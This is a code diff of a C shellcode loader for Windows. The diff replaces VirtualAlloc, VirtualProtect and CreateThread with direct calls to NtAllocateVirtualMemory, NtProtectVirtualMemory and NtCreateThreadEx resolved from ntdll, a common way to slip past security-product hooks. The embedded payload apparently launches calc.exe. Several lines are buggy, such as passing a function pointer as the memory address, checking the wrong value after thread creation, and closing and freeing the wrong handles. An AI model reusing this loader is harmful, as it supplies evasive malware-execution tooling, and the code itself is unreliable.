@@ -23,32 +23,73 @@ unsigned char buf[] =
 "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
 "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
-int main() {
+typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
+    HANDLE, // Process Handle
+    PVOID,
+    ULONG_PTR, 
+    PSIZE_T, // Region size
+    ULONG, 
+    ULONG
+    );
+
+typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(
+    HANDLE,
+    PVOID,
+    PULONG,
+    ULONG,
+    PULONG
+    );
+
+typedef NTSTATUS(NTAPI* _NtCreateThreadEx)(
+    PHANDLE,
+    ACCESS_MASK,
+    PVOID,
+    HANDLE,
+    PVOID,
+    PVOID,
+    ULONG,
+    SIZE_T,
+    SIZE_T,
+    SIZE_T,
+    PVOID 
+    );
+
+int main(int argc, char* argv[]) {
+    HANDLE ph; // process handle
+    HANDLE ht; // thread handle
+    //Get the address of the dll
+    HMODULE ntd = GetModuleHandleA("ntdll.dll");
+    ph = GetCurrentProcess();
     // We allocate virtual memory to the shellcode 
-    void* exec_mem = VirtualAlloc(0, sizeof(buf), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    if (!exec_mem) {
+    _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(ntd, "NtAllocateVirtualMemory");
+    SIZE_T size = sizeof(buf);
+    PVOID baseAddress = 0;
+    NtAllocateVirtualMemory(ph, &baseAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    if (baseAddress == 0) {
         printf("Failed to allocate memory.\n");
         return 1;
     }
-    memcpy(exec_mem, buf, sizeof(buf));
+    memcpy(baseAddress, buf, size);
     DWORD oldProtects = 0;
-    VirtualProtect(exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &oldProtects);
+    _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(ntd, "NtProtectVirtualMemory");
+    NtProtectVirtualMemory(ph, NtAllocateVirtualMemory,(PULONG) &size, PAGE_EXECUTE_READ, &oldProtects);
     // Create a new thread to execute the shellcode
-    HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
-    printf("%x", hThread);
-    if (!hThread) {
+    _NtCreateThreadEx ntCTEx = (_NtCreateThreadEx)GetProcAddress(ntd, "NtCreateThreadEx");
+    ntCTEx(&ht, THREAD_ALL_ACCESS, NULL, ph, baseAddress, 0, 0, 0, 0, 0, 0);
+
+    if (!ntCTEx) {
         printf("Failed to create thread.\n");
-        VirtualFree(exec_mem, 0, MEM_RELEASE);
+        VirtualFree(NtProtectVirtualMemory, 0, MEM_RELEASE);
         return 1;
     }
 
-    DWORD waitResult = WaitForSingleObject(hThread, INFINITE);
+    DWORD waitResult = WaitForSingleObject(ht, INFINITE);
     if (waitResult != WAIT_OBJECT_0) {
         printf("Error: WaitForSingleObject failed. Error code: %lu\n", GetLastError());
     }
     // Clean up
-    CloseHandle(hThread);
-    VirtualFree(exec_mem, 0, MEM_RELEASE);
-
+    CloseHandle(ntCTEx);
+    VirtualFree(baseAddress, 0, MEM_RELEASE);
     return 0;
 }
